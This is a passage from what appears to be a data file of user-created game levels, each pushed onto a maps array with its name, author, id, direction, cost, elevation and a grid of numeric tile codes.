0,0,199,199,199,199,199,199,199,199,0,0,23,18,18,18,18,18,18,23,0,0,199,199,199,199,199,199,199,199,0,0,23,17,17,99,17,17,17,23,0,0,199,199,199,199,0,199,199,199,199,0,23,98,98,98,98,98,98,23,0,199,199,199,199,199,0,0,199,199,199,0,23,16,16,16,16,16,16,23,0,199,199,199,199,199,0,0,199,199,199,0,0,130,130,130,130,130,130,0,0,199,199,199,199,199,0,0,0,199,199,199,0,93,130,130,130,130,94,0,199,199,199,199,199,199,0,0,199,199,199,199,0,9,65,65,65,65,94,0,199,199,199,199,199,199,0,199,199,199,199,199,0,9,65,65,65,65,9,0,199,199,199,199,199,199,0,0,199,199,199,199,0,9,9,2,2,9,9,0,199,0,0,199,199,199]});
maps.push({name="Hold the line",author="IV",id="#1670112698",direction="forward",cost=345,elevation=4,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,9,9,9,132,0,0,0,131,10,10,133,0,0,0,134,9,9,9,0,0,9,9,9,9,0,0,0,10,10,10,10,0,0,0,9,9,9,9,0,0,9,91,9,77,0,0,0,148,148,148,148,0,0,0,77,9,91,9,0,0,9,9,9,77,0,0,19,14,14,14,14,19,0,0,77,9,9,9,0,0,9,9,9,77,0,0,16,14,14,14,14,16,0,0,77,9,9,9,0,0,9,91,9,77,0,0,19,14,14,14,14,19,0,0,77,9,91,9,0,0,9,9,9,77,0,0,16,14,14,14,14,16,0,0,77,9,9,9,0,0,9,9,9,77,0,0,19,14,14,14,14,19,0,0,77,9,9,9,0,0,9,91,9,77,0,0,16,14,14,14,14,16,0,0,77,9,91,9,0,0,9,9,9,77,0,0,19,14,14,14,14,19,0,0,77,9,9,9,0,0,9,9,9,9,10,11,12,14,14,14,14,12,11,10,9,9,9,9,0,0,9,9,9,9,10,11,12,14,14,14,14,12,11,10,9,9,9,9,0,0,195,195,195,195,0,0,0,14,14,14,14,0,0,0,196,196,196,196,0,0,0,65,9,140,20,20,0,14,14,14,14,0,20,20,140,9,65,0,0,0,0,65,9,140,20,100,0,14,14,14,14,0,93,20,140,9,65,0,0,0,0,9,9,0,0,0,0,14,14,14,14,0,0,0,0,9,9,0,0,0,0,8,8,8,8,8,8,14,14,14,14,8,8,8,8,8,8,0,0,0,0,94,8,8,97,8,141,14,14,14,14,141,8,99,8,8,94,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0]});
maps.push({name="High risk treasure",author="IV",id="#1670125770",direction="forward",cost=358,elevation=0,map=[0,0,0,0,0,0,18,7,2,2,7,14,10,10,10,10,10,10,0,0,24,21,19,19,24,0,24,7,7,7,7,96,6,6,6,45,45,10,0,0,24,6,129,0,0,0,0,7,195,195,7,96,6,6,6,45,45,10,0,0,19,94,94,6,19,0,17,7,7,7,7,14,10,10,10,45,45,10,0,0,21,94,94,6,21,0,21,7,7,7,7,22,0,0,10,45,45,10,0,0,17,6,6,6,24,0,24,7,195,7,7,17,0,0,10,45,45,10,0,0,199,10,10,199,0,0,21,7,7,7,7,14,10,10,10,45,45,10,0,0,199,10,10,199,18,0,24,7,7,195,7,96,6,6,6,45,45,10,0,0,19,93,10,10,14,0,24,195,7,7,7,96,6,6,6,45,45,10,0,0,16,10,10,10,96,9,9,8,7,7,7,14,10,10,10,45,45,10,0,0,20,93,10,93,96,9,9,8,7,195,7,21,0,0,10,45,45,10,0,0,21,10,10,10,96,9,9,8,7,7,7,22,0,0,10,45,45,10,0,0,20,93,10,10,14,97,24,7,7,7,195,19,0,0,10,45,45,10,0,0,199,10,10,199,18,0,17,7,7,7,7,15,10,10,10,45,45,10,0,0,199,96,96,199,0,0,21,7,195,7,7,96,6,6,6,45,45,10,0,0,0,9,9,15,0,0,24,7,7,7,7,96,6,6,6,45,45,10,0,0,0,8,8,14,0,24,17,195,7,7,7,14,10,10,10,10,10,10,0,0,0,7,7,15,14,15,19,7,7,7,7,21,18,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,2,2,7,7,100,0,0,0,0,0,0,0]});
maps.push({name="Let The Items Go Man",author="ZpLit",id="#1670383363",direction="right",cost=236,elevation=-2,map=[21,56,2,2,56,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,56,56,56,56,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,56,56,56,56,21,21,21,21,21,20,19,19,19,19,0,0,0,0,0,21,56,56,56,56,56,56,56,56,56,55,54,54,54,54,19,0,0,0,0,21,56,56,56,56,56,56,56,56,56,55,54,54,54,54,54,19,0,0,0,21,56,56,56,56,56,56,56,56,56,55,54,54,54,54,54,54,19,0,0,21,56,56,56,56,56,56,56,56,56,55,54,54,54,54,54,54,19,0,0,21,21,95,21,21,21,56,56,56,21,20,19,19,54,54,54,54,19,19,19,21,16,16,16,21,56,56,56,21,0,0,0,19,54,54,54,54,54,54,54,21,16,16,16,21,94,56,21,0,0,0,0,19,54,54,132,54,54,54,2,21,16,127,16,21,21,21,0,0,0,0,0,19,54,54,54,54,54,54,2,0,0,0,0,1,0,0,0,0,0,0,0,0,19,54,54,54,54,54,54,0,0,0,0,1,0,0,0,0,0,0,0,0,0,19,199,199,199,19,19,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,93,131,93,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,93,14,93,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,14,14,14,1,0,0,0,1,15,15,15,1,1,1,0,0,0,0,0,0,14,14,129,0,1,0,1,0,15,15,129,0,0,0,0,0,0,0,0,0,14,14,14,0,0,1,0,0,15,15,15,0,0,0,0,0,0,0,0]});
maps.push({name="revolving door",author="Applily",id="#1670482165",direction="forward",cost=173,elevation=3,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,131,131,0,0,1,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,16,16,1,1,1,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,16,16,91,16,148,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,16,16,91,16,148,13,13,1,0,0,0,0,0,0,0,0,0,0,0,0,16,16,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,1,12,12,12,0,0,0,0,0,0,0,0,0,0,93,19,0,195,195,0,1,12,132,12,0,0,0,0,0,0,0,0,0,0,93,19,0,195,195,0,1,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,1,12,12,12,183,183,183,183,183,183,12,12,0,0,0,0,0,90,90,0,1,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,0,90,90,0,1,0,10,0,0,0,0,0,0,12,97,12,0,0,0,0,0,90,90,0,0,0,0,0,10,0,10,10,0,12,12,12,133,0,0,0,0,90,90,0,0,0,0,154,12,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,134,16,16,90,90,90,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,90,90,16,16,0,0,0,0,153,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,7,0,0,0,0,0,0]});
maps.push({name="Jumps",author="CoolDude",id="#1670531424",direction="right",cost=116,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,94,0,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,35,35,0,41,41,41,0,0,0,0,97,27,0,26,0,25,0,5,5,0,35,35,3,41,127,41,0,0,0,0,0,0,0,0,0,0,0,96,96,0,35,35,0,41,41,41,0,0,0,27,0,199,32,0,34,0,0,0,0,0,35,35,0,0,0,0,0,0,0,0,0,199,0,0,0,0,0,25,0,35,35,35,0,0,0,0,0,0,0,0,0,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,0,199,31,0,35,93,65,27,0,33,0,0,0,0,0,0,0,0,0,0,0,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,29,0,0,0,92,29,0,31,199,0,0,0,0,0,0,0,0,29,0,199,0,0,0,0,0,0,0,199,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,0,0,0,0,93,29,0,0,0,0,0,0,0,0,0,92,29,3,25,25,25,25,25,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,25,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Wipeout",author="CoolDude",id="#1670622580",direction="forward",cost=249,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,25,25,25,25,25,0,0,0,25,25,25,25,25,25,25,25,25,25,0,0,25,25,25,25,25,0,0,0,25,25,25,25,25,9998,25,25,25,25,0,0,5,0,0,25,25,0,0,0,25,25,24,0,9998,148,24,0,0,0,24,148,9998,0,24,25,25,0,0,0,25,25,199,0,5,0,0,0,0,0,0,1,5,0,199,25,25,0,0,0,25,25,24,0,9998,148,24,0,0,0,0,1,5,0,199,25,25,0,0,0,25,25,199,0,5,0,0,0,0,0,24,148,9998,0,24,25,25,0,0,0,25,25,24,0,9998,148,24,0,0,0,0,1,5,0,199,25,25,0,0,0,25,25,199,0,5,0,0,0,0,0,0,1,5,0,199,25,25,0,0,0,25,25,24,0,9998,148,24,0,0,0,24,148,9998,0,24,25,25,0,0,0,25,25,199,0,5,0,0,0,0,0,0,1,5,0,199,25,25,0,0,0,25,25,24,0,9998,148,24,0,0,0,0,1,5,0,199,25,25,0,0,0,25,25,199,0,5,0,0,0,0,0,24,148,9998,0,24,25,25,0,0,0,25,25,24,0,9998,148,24,0,0,0,0,1,25,25,199,25,25,25,134,25,25,25,199,0,5,0,0,0,0,0,0,0,25,25,199,25,25,25,25,25,132,25,199,0,93,0,0,0,0,0,0,0,93,25,199,0,25,25,0,0,199,199,199,0,131,0,0,0,0,0,0,133,25,93,199,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,25,199,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Edgewarrior v2",author="sivi",id="#1670634156",direction="forward",cost=213,elevation=0,map=[0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,90,114,114,90,1,0,0,0,0,0,0,0,0,0,1,114,114,114,114,114,114,114,114,114,1,0,0,0,0,0,0,0,0,0,1,114,114,114,114,114,114,114,114,114,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,90,114,114,90,1,0,0,0,0,0,0,0,0,174,1,173,168,0,0,199,114,114,114,114,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,199,114,114,114,88,1,0,0,0,0,0,0,0,168,176,1,177,0,0,0,199,114,114,114,114,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,199,114,114,114,90,1,0,0,0,0,0,0,0,0,180,1,179,168,0,0,199,114,114,114,114,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,199,114,114,114,88,1,0,0,0,0,0,0,0,168,182,1,190,0,0,0,199,114,114,114,114,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,90,114,114,90,1,0,0,0,0,0,0,0,0,193,1,192,168,0,0,1,1,95,95,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,90,114,114,132,1,0,0,0,0,0,0,0,0,0,1,114,114,114,114,199,114,114,114,114,1,0,0,0,0,0,0,0,0,0,1,131,114,114,114,199,114,114,114,114,1,0,0,0,0,0,0,0,0,0,1,93,93,93,93,199,114,114,114,114,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,90,114,114,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0]});
maps.push({name="Edgewarrior",author="sivi",id="#1670696711",direction="left",cost=319,elevation=0,map=[1,1,1,1,1,1,0,0,0,0,0,0,0,0,1,1,2,2,1,1,1,90,114,114,90,1,0,0,0,0,0,0,0,0,1,90,114,114,90,1,2,114,114,114,114,1,0,0,0,0,0,0,0,0,1,114,114,114,114,1,2,114,114,114,114,1,0,0,0,0,0,0,0,0,1,94,114,114,94,1,1,90,114,114,90,1,0,0,0,0,0,0,0,0,1,114,114,114,114,1,1,1,95,95,1,1,1,1,1,1,1,1,1,1,1,90,114,114,90,1,1,90,114,114,114,90,114,114,90,114,114,90,114,114,90,114,114,114,114,1,1,134,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,1,1,90,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,90,1,1,1,114,114,114,90,114,114,114,114,114,114,114,114,114,114,114,90,1,1,0,1,114,114,1,1,199,199,199,199,199,199,199,199,199,199,199,1,1,0,0,1,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,114,114,114,9,9,9,9,9,9,9,9,9,14,14,93,1,0,0,0,1,114,132,114,3,9,9,9,9,9,9,9,9,14,14,93,1,0,0,0,1,90,114,114,9,9998,9998,9998,9998,9998,9998,9998,9,14,14,93,1,0,0,0,1,1,1,1,1,131,1,131,1,131,1,131,1,14,14,133,1,0,0,0,0,0,0,0,1,114,1,114,1,114,1,114,1,1,1,1,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RaincandyU",author="IV",id="#1670698386",direction="right",cost=513,elevation=0,map=[11,11,11,11,199,199,199,199,199,199,199,199,22,22,22,199,2,2,9,9,11,199,199,199,11,11,11,9,9,9,9,9,199,199,199,199,199,199,7,7,199,11,11,11,11,11,11,11,9,9,9,9,9,9,9,9,9,9,9,9,11,11,11,11,11,11,11,11,11,9,9,9,9,9,9,9,9,9,9,9,11,11,11,11,11,11,11,11,11,9,9,199,9,9,9,9,9,9,9,9,11,11,11,11,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,11,11,11,16,11,11,11,9,9,5,199,199,9,9,11,199,154,23,154,154,11,11,16,11,11,11,11,9,5,154,199,199,9,9,11,199,154,23,23,154,11,199,11,11,11,9,9,5,154,0,199,199,199,199,199,154,23,23,23,199,11,199,11,11,11,11,11,11,5,154,0,199,23,23,23,23,23,76,23,199,11,199,11,11,11,11,11,11,40,5,154,23,23,23,23,23,23,76,23,199,11,11,199,11,11,9,11,40,11,40,5,1,1,1,23,23,23,23,23,199,11,11,199,11,11,11,9,9,40,9,1,76,76,76,1,23,23,23,199,19,11,11,11,16,11,11,11,11,9,9,1,76,76,76,76,1,23,154,199,19,11,11,11,11,16,11,11,11,9,9,9,1,76,76,76,76,1,199,199,199,199,11,11,11,11,16,9,9,9,9,1,76,76,76,76,1,9,9,9,2,19,199,11,11,11,11,199,199,199,199,1,76,76,76,1,9,9,9,9,2,19,19,199,11,11,11,11,9,9,9,9,1,1,1,9,9,9,9,9,199,19,19,19,199,199,11,11,11,9,9,9,9,9,9,9,9,199,199,199,19,19,19,19,19,19,199,199,199,199,199,199,199,199,199,199,199,19,19,19,19]});
maps.push({name="Deescalate",author="ZpLit",id="#1670721006",direction="forward",cost=406,elevation=-16,map=[0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,21,21,24,24,24,24,24,24,24,24,0,24,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,24,24,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,24,24,21,21,1,1,1,1,1,1,1,1,1,1,1,1,1,1,21,21,24,24,21,21,21,21,21,21,21,195,21,21,195,21,21,21,21,21,21,21,24,24,21,21,21,21,21,21,21,195,21,21,195,21,21,21,21,21,21,21,24,24,24,24,24,24,24,24,24,24,21,21,24,24,24,24,24,24,24,24,24,65,65,65,65,24,65,65,24,21,21,21,21,24,65,65,24,65,65,65,65,67,67,67,67,66,67,67,24,21,21,21,21,24,67,67,66,67,67,67,67,66,66,66,66,66,66,66,1,148,148,148,148,1,66,66,66,66,66,66,66,5,5,5,5,5,5,5,97,105,105,105,105,97,5,5,5,5,5,5,5,5,5,5,5,5,90,5,5,5,5,5,90,5,5,90,5,5,5,5,5,0,0,0,5,5,5,5,5,90,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,5,5,90,5,5,5,5,5,90,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,90,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,90,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,90,5,5,5,5,5,90,5,0,0,0,0,0,0,0,0,0,0,0,5,5,95,95,95,95,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,2,2,95,0,0,0,0,0,0,0,0]});
maps.push({name="Should You Press It",author="ZpLit",id="#1670721474",direction="left",cost=294,elevation=0,map=[0,14,2,2,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,14,14,14,195,66,69,68,68,68,68,66,14,14,0,0,0,0,0,0,0,14,14,14,195,66,69,68,68,68,68,66,14,14,0,0,0,0,0,0,0,14,14,14,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,14,14,14,1,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,1,14,93,14,1,0,0,0,14,14,0,0,0,0,0,0,0,14,14,14,1,90,14,14,1,97,0,0,0,0,0,0,0,0,0,0,0,14,14,14,1,14,14,14,1,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,1,14,14,90,1,0,0,0,14,14,0,0,0,0,0,0,0,1,98,98,1,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,85,85,1,14,14,14,1,1,1,1,0,0,0,0,1,1,1,0,0,1,14,14,1,90,14,14,14,14,14,14,96,96,0,0,98,14,94,1,0,1,14,14,1,14,14,14,14,14,14,14,14,14,0,0,98,14,94,1,0,1,91,91,1,1,1,1,0,0,0,14,14,14,0,0,1,1,1,0,1,90,14,14,14,14,93,1,0,0,0,14,14,14,0,0,0,0,0,0,2,14,14,14,90,14,14,1,0,0,14,14,14,14,14,0,0,0,0,0,2,14,14,14,14,14,14,1,0,14,14,14,87,14,14,14,0,0,0,0,1,14,90,14,14,14,14,95,14,14,14,14,0,14,14,14,14,14,14,14,1,14,14,14,14,90,14,95,14,14,14,0,0,0,14,14,14,14,14,99,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Strafe Shrine",author="sivi",id="#1670763463",direction="forward",cost=320,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,145,9,0,0,1,33,94,1,5,5,1,94,33,1,0,0,9,145,0,0,9,125,0,0,0,0,0,90,5,5,90,0,0,0,0,0,125,9,0,0,0,0,0,5,90,5,5,5,5,5,5,5,5,90,5,0,0,0,0,0,0,0,5,65,65,65,65,65,65,65,65,65,65,65,65,5,0,0,0,0,1,0,90,65,158,5,5,5,5,5,5,5,5,158,65,90,0,1,0,0,33,0,5,65,5,5,0,67,0,0,67,0,5,5,65,5,0,33,0,0,129,0,5,65,5,0,0,0,0,0,0,0,0,5,65,5,0,128,0,0,1,0,90,65,5,67,0,18,52,52,18,0,67,5,65,90,0,1,0,0,0,0,5,65,5,0,0,52,93,93,52,0,0,5,65,5,0,0,0,0,0,0,5,65,5,0,0,52,93,93,52,0,0,5,65,5,0,0,0,0,1,0,90,65,5,67,0,18,52,52,18,0,67,5,65,90,0,1,0,0,129,0,5,65,5,0,0,0,0,0,0,0,0,5,65,5,0,128,0,0,33,0,5,65,5,5,0,67,0,0,67,0,5,5,65,5,0,33,0,0,1,0,90,65,158,5,5,5,5,5,5,5,5,158,65,90,0,1,0,0,0,0,5,65,65,65,65,65,65,65,65,65,65,65,65,5,0,0,0,0,0,0,0,5,90,5,5,5,5,5,5,5,5,90,5,0,0,0,0,0,9,125,0,0,0,0,0,90,5,5,90,0,0,0,0,0,125,9,0,0,145,9,0,0,1,33,94,1,5,5,1,94,33,1,0,0,9,145,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0]});
maps.push({name="Futaleufu v2",author="Dogeeri",id="#1670853376",direction="forward",cost=595,elevation=-10,map=[91,2,2,91,199,199,199,199,199,199,199,199,199,0,0,0,0,0,0,0,24,24,24,24,199,89,76,76,75,75,75,75,199,0,0,0,0,0,0,0,123,23,23,123,199,76,76,76,75,17,16,75,1,67,67,0,0,0,0,0,122,122,122,122,199,31,31,3,18,18,75,89,98,66,66,67,0,0,0,0,1,91,121,91,199,94,76,76,18,18,16,75,1,16,66,66,67,0,0,0,199,121,91,121,199,31,76,76,19,19,99,16,1,16,66,66,66,67,0,0,127,144,121,120,199,76,76,76,20,20,20,20,98,20,16,72,72,67,0,0,21,96,118,119,199,89,76,76,1,95,95,1,1,20,20,66,72,72,67,0,17,117,165,166,199,199,199,1,1,96,96,1,1,85,20,16,72,72,67,0,17,116,165,199,16,12,20,142,20,20,20,132,199,20,20,16,72,72,67,0,16,116,165,16,12,125,20,142,20,20,20,87,199,3,20,16,66,72,72,67,16,116,165,16,14,12,20,142,20,183,20,20,199,54,19,16,66,66,66,67,16,116,165,75,1,199,1,1,183,20,20,91,199,54,19,16,65,65,65,67,16,16,165,75,96,149,22,96,21,20,91,89,199,54,18,16,16,65,65,65,135,16,75,75,96,149,22,96,21,20,91,97,199,54,18,17,16,15,14,14,135,16,15,15,1,199,1,1,183,20,20,91,199,93,18,17,16,15,14,14,135,16,16,15,14,3,20,143,20,183,20,20,1,1,1,1,16,15,14,89,66,66,16,15,14,3,20,143,20,20,20,1,1,0,173,0,15,15,14,14,66,66,66,66,66,76,94,1,1,1,20,1,100,174,168,176,14,14,14,14,199,199,199,1,1,1,1,131,93,1,89,1,1,0,175,0,14,2,2,14]});
maps.push({name="Wither Slayer",author="ZpLit",id="#1670871656",direction="forward",cost=254,elevation=0,map=[0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,14,14,14,14,14,14,9998,9998,14,14,14,14,14,14,0,0,0,0,0,0,14,14,14,19,19,19,9998,9998,19,19,19,14,14,14,0,0,0,0,0,0,14,14,14,19,24,24,9998,9998,24,24,19,14,14,14,0,0,0,0,0,0,14,14,14,19,24,24,199,199,24,24,19,14,14,14,0,0,0,0,0,77,83,83,83,9998,9998,199,93,93,199,9998,9998,84,84,84,77,0,0,0,0,77,83,83,83,9998,9998,199,88,88,199,9998,9998,84,84,84,77,0,0,0,0,0,14,14,14,19,24,24,95,95,24,24,19,14,14,14,0,0,0,0,0,0,14,14,14,19,24,24,14,14,24,24,19,14,14,14,0,0,0,0,0,0,14,14,14,19,19,19,14,14,19,19,19,14,14,14,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,87,2,2,87,0,0,0,0,0,0,0,0]});
maps.push({name="OK Dude",author="ZpLit",id="#1670873631",direction="forward",cost=161,elevation=0,map=[0,24,24,3,14,14,14,14,14,2,2,14,14,14,14,14,3,24,24,0,0,24,24,3,14,14,14,14,14,14,14,14,14,14,14,14,3,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,0,3,1,0,0,0,0,0,0,0,0,0,0,0,1,183,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,0,3,1,0,0,0,0,0,0,0,0,0,0,0,1,183,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,0,3,1,0,0,0,0,0,0,0,0,0,0,0,1,183,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,0,24,24,65,14,14,14,96,96,96,96,96,96,14,14,14,65,24,24,0,0,93,97,65,14,14,14,96,96,2,2,96,96,14,14,14,65,24,24,0]});
maps.push({name="Overpass",author="ZpLit",id="#1670906079",direction="left",cost=339,elevation=-1,map=[0,0,0,0,0,0,0,0,0,0,0,20,14,2,2,14,14,14,20,0,0,0,0,0,0,0,0,0,0,0,20,14,14,14,14,14,14,14,20,0,0,0,0,0,0,0,0,0,0,0,20,14,14,14,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,20,14,14,90,20,14,11,11,20,0,0,0,0,0,0,0,0,0,0,0,20,14,14,14,14,14,11,11,11,20,0,0,0,0,0,0,0,0,0,0,20,14,14,9998,13,13,11,90,11,20,0,0,0,9998,20,20,20,20,20,20,0,20,20,20,12,12,9998,11,11,20,0,20,9998,93,18,13,65,65,65,65,20,0,0,20,11,11,11,11,11,20,20,13,20,53,18,13,65,65,65,65,17,17,17,17,11,11,11,11,11,20,20,13,20,53,18,13,11,65,65,65,51,51,51,51,11,11,11,11,11,20,20,13,20,13,13,13,65,65,65,65,20,20,20,17,11,11,11,11,11,20,20,13,20,13,13,13,65,11,11,11,12,13,13,20,17,51,17,20,20,0,20,13,20,20,20,20,65,20,20,20,20,13,90,20,17,51,17,0,0,0,20,13,13,13,13,13,20,20,20,20,20,13,13,20,17,51,17,20,0,0,20,13,13,13,13,13,13,9998,9998,13,13,13,13,20,20,11,11,11,20,0,20,13,13,20,20,13,9998,65,65,15,87,13,13,13,12,11,11,11,20,0,2,13,13,20,12,12,65,65,65,15,13,13,1,13,12,11,11,11,20,0,2,13,13,20,11,11,65,65,65,13,13,13,13,13,12,11,11,11,20,0,20,20,20,20,11,11,11,11,11,12,13,13,90,17,12,11,11,11,20,0,0,0,0,0,20,20,20,20,20,20,20,20,20,20,20,20,20,20,0,0]});
maps.push({name="CVpaste 10",author="ZpLit",id="#1670907166",direction="left",cost=410,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,160,160,14,0,0,0,0,0,0,0,0,14,162,162,162,162,162,162,160,14,160,160,14,0,0,0,0,0,0,0,0,14,159,159,162,162,162,162,160,14,160,160,14,0,0,0,0,0,0,0,0,14,159,159,14,14,14,160,160,14,160,160,14,0,0,0,0,14,14,14,14,14,159,159,14,14,14,160,160,14,160,160,14,0,0,0,0,14,66,66,66,14,159,159,14,14,14,160,160,14,160,160,14,0,0,0,14,14,66,66,66,14,159,159,14,14,14,160,160,14,160,160,14,0,0,0,2,14,66,66,66,14,158,161,161,161,161,160,160,14,160,160,14,0,0,0,2,14,66,66,66,14,158,161,161,161,161,161,161,14,160,160,14,0,0,0,14,14,66,66,66,14,158,158,14,14,14,14,14,14,160,160,14,0,0,0,0,14,66,66,66,14,159,159,14,14,14,14,14,14,160,160,14,0,0,0,0,14,14,14,14,14,159,161,161,161,161,161,161,161,160,160,14,0,0,0,0,0,0,0,0,14,159,161,161,161,161,161,161,161,161,161,14,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
